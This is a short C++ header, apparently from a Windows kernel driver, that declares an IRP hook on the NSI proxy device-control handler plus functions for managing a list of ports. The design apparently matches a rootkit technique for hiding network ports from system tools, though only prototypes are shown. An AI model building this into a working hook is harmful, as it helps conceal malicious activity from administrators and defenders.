#pragma once
#include "helpers.h"


typedef NTSTATUS(*MajorDeviceControlNsiProxy)(IN PDEVICE_OBJECT DeviceObject,
												IN PIRP Irp);

namespace irphooking {
	namespace port_list {
		NTSTATUS InitializePortList();
		NTSTATUS AddToPortList(USHORT Port);
		NTSTATUS RemoveFromPortList(USHORT RemovePort, USHORT RemoveIndex);
		BOOL CheckIfInPortList(USHORT CheckPort, int* IndexInList);
		NTSTATUS ReturnPortList(PVOID* PortListOutput, ULONG64* PortListSizeOutput);
	}
	NTSTATUS InitializeIrpHook(ULONG DriverTag, ULONG MajorFunction, PVOID HookingFunction);
	NTSTATUS ReleaseIrpHook(ULONG DriverTag, ULONG MajorFunction);
	NTSTATUS EvilMajorDeviceControlNsiProxy(IN PDEVICE_OBJECT DeviceObject,
		IN PIRP Irp);
	NTSTATUS EvilCompletionNsiProxy(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp, IN PVOID Context);
}